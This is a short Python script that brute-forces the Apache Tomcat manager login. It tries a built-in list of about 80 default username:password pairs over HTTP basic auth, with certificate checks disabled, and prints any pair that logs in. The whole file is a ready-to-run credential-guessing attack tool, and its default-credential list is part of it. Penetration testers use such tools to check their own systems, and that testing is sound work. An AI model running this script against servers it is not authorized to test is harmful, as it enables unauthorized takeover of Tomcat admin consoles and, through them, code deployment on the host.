#!/usr/bin/env python3
"""
@author: bl4de | bloorq@gmail.com
@licence: MIT | https://opensource.org/licenses/MIT

Apache Tomcat credentials bruteforce login
with Tomcat defualt username/password list.

So technically it's not bruteforcing :) 
"""

import requests
import argparse
import urllib3

"""
default Apache Tomcat credentials
source: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
"""

urllib3.disable_warnings()

credentials = [
    'admin:',
    'admin:admanager',
    'admin:admin',
    'admin:admin',
    'ADMIN:ADMIN',
    'admin:adrole1',
    'admin:adroot',
    'admin:ads3cret',
    'admin:adtomcat',
    'admin:advagrant',
    'admin:password',
    'admin:password1',
    'admin:Password1',
    'admin:tomcat',
    'admin:vagrant',
    'both:admanager',
    'both:admin',
    'both:adrole1',
    'both:adroot',
    'both:ads3cret',
    'both:adtomcat',
    'both:advagrant',
    'both:tomcat',
    'cxsdk:kdsxc',
    'j2deployer:j2deployer',
    'manager:admanager',
    'manager:admin',
    'manager:adrole1',
    'manager:adroot',
    'manager:ads3cret',
    'manager:adtomcat',
    'manager:advagrant',
    'manager:manager',
    'ovwebusr:OvW*busr1',
    'QCC:QLogic66',
    'role1:admanager',
    'role1:admin',
    'role1:adrole1',
    'role1:adroot',
    'role1:ads3cret',
    'role1:adtomcat',
    'role1:advagrant',
    'role1:role1',
    'role1:tomcat',
    'role:changethis',
    'root:admanager',
    'root:admin',
    'root:adrole1',
    'root:adroot',
    'root:ads3cret',
    'root:adtomcat',
    'root:advagrant',
    'root:changethis',
    'root:owaspbwa',
    'root:password',
    'root:password1',
    'root:Password1',
    'root:r00t',
    'root:root',
    'root:toor',
    'tomcat:',
    'tomcat:admanager',
    'tomcat:admin',
    'tomcat:admin',
    'tomcat:adrole1',
    'tomcat:adroot',
    'tomcat:ads3cret',
    'tomcat:adtomcat',
    'tomcat:advagrant',
    'tomcat:changethis',
    'tomcat:password',
    'tomcat:password1',
    'tomcat:s3cret',
    'tomcat:s3cret',
    'tomcat:tomcat',
    'xampp:xampp',
    'server_admin:owaspbwa',
    'admin:owaspbwa',
    'demo:demo'
]

def brute(args):
    """
    Iterate over login:password pairs from credentials array and send GET request to 
    Apache Tomcat with Authorization header set

    If HTTP response status is equal 200, we found valid credentials
    """
    url = "{}://{}:{}/{}".format(args.proto.lower(), args.host, args.port, args.manager)
    for lp in credentials:
        (login, password) = lp.split(':')
        print("[.] checking {}:{}..................................................\r".format(login, password), end="")
        resp = requests.get(
            url=url,
            auth=(login, password),
            verify=False
        )

        # 401 Unauthorized ?
        if resp.status_code == 200:
            return (login, password)

    return (False, False)


def main():
    """
    Main execution routine.
    """
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-H", "--host", help="Apache Tomcat hostname")
    parser.add_argument(
        "-P", "--proto", help="Protocol: http or https", choices=['http', 'https'])
    parser.add_argument(
        "-m", "--manager", help="Path to Host Manager (default: /manager/html)", default="manager/html"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=8080, help="port (default - 8080)")

    args = parser.parse_args()

    (login, password) = brute(args)

    if login != False:
        print("[+] BOOM! Found valid credentials: [{}:{} ]".format(login, password))
    else:
        print("[-] No valid credentials found :(")

    exit(0)


"""
Run!
"""
main()
